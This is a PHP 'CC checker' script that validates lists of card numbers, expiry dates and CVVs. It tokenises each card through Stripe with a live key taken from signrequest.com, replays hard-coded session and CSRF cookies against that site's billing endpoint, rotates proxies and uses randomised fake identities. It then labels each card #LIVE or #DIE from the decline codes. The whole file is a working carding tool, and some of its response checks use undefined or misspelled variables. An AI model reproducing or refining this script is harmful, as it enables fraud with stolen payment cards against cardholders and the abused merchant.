<?php

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
# -------------------- [1 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=23370e38-c733-4585-8329-ed8328e5aa49ff2f80&muid=89f4a4eb-b65f-4a45-a8a2-25938a967d9f02c18a&sid=1e295aab-8090-4d90-a2c4-fca4c3aeae32e34431&payment_user_agent=stripe.js%2Fd9f937cbd%3B+stripe-js-v3%2Fd9f937cbd&time_on_page=20783&referrer=https%3A%2F%2Fsignrequest.com%2F&key=pk_live_hDwfrJDvx56D8YbIDtFDsxx2');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://signrequest.com/orders/billing/update-card');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: signrequest.com',
'method: POST',
'path: /orders/billing/update-card',
'scheme: https',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/json;charset=UTF-8',
'cookie: sr_device_id=e8b38b45-7aa4-4580-8efa-f1b0c087a0c0; __stripe_mid=89f4a4eb-b65f-4a45-a8a2-25938a967d9f02c18a; __stripe_sid=1e295aab-8090-4d90-a2c4-fca4c3aeae32e34431; csrftoken=lNa9AlSXwXjXAI9KMFAEVGaCxgcsmqMXax8JwyCTJBp3U9Oyr3twmllddTnYqgNL; sr_user_tags=%5B%22enable_beta_homebox%22%5D; sr_uuid=9741431f-6934-45a0-8890-4ee550d2f147; sessionid=66caftyf3glhtdi0tngdcof4vgndehtp',
'origin: https://signrequest.com',
'referer: https://signrequest.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'x-csrftoken: lNa9AlSXwXjXAI9KMFAEVGaCxgcsmqMXax8JwyCTJBp3U9Oyr3twmllddTnYqgNL',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"stripe_token":"'.$id.'"}');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

// this is for additional info - so result will look more good by adding the info of the bin

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #



# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #
if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}


elseif(strpos($result1, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
}

elseif(strpos($result3, "fraudulent" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY GUNNU</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif(strpos($result3, "authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result3, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
   } 
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';

}
elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result3, "card_not_supported")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($result3,"currency_not_supported")) {
	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
}
elseif(strpos($result3, "fraudulent" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY #DIE OR INVALID</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "An error occurred" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
}
else {
    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
   
   
      
}
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#

?>
